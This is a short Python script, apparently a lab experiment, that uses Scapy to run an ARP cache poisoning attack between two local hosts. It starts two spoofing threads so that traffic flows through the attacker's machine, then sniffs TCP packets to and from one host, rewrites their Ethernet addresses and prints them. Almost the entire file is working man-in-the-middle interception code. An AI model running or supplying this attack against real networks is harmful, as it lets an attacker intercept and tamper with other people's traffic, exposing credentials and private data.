from scapy.layers.l2 import arpcachepoison
from scapy.sendrecv import AsyncSniffer, sendp, srp1
from scapy.layers.l2 import Ether
from scapy.layers.inet import TCP
from scapy.utils import hexdump
from scapy.config import conf
from scapy.all import Raw
import threading

conf.verb = False

target = "192.168.255.3"
victim = "192.168.255.2"
# victim = "192.168.255.1"


def packet_handler(packet: Ether):
    # pass
    # _packet = Ether(dst="aa:aa:aa:aa:aa:aa", src="6a:ea:d2:33:40:66")/Raw(load=packet.load)
    _packet = packet.copy()
    _packet[Ether].dst = "aa:aa:aa:aa:aa:aa"
    _packet[Ether].src = "02:42:c0:a8:ff:04"
    # print(_packet.show())
    # print(hexdump(_packet))
    print(_packet)
    # _packet = Ether(dst="aa:aa:aa:aa:aa:aa",
    # src="6a:ea:d2:33:40:66")/TCP(packet[TCP])
    # res = srp1(_packet)
    # print(res)
    # print(packet.fields)
    # print(dir(packet))
    # print(packet[TCP])
    # res = srp1(packet)
    # raw = res.lastlayer()
    # res.show()
    # hexdump(raw)
    # print(res.show())
    # res1 = srp1(res)
    # res1.show()
    # hexdump(res1)


def tcp_sniffer():
    sniffer = AsyncSniffer()
    sniffer._run(filter='tcp and host 192.168.255.2',
                 prn=packet_handler, count=0)
    # sniffer.results.summary()


def main():
    arp_spoofing = threading.Thread(
        target=arpcachepoison, args=(target, victim, 2))
    arp_spoofing.start()
    arp_spoofing_gw = threading.Thread(
        target=arpcachepoison, args=(victim, target, 2))
    arp_spoofing_gw.start()
    tcp_sniffer()
    # arp_spoofing.join()
    # pass


if __name__ == "__main__":
    main()
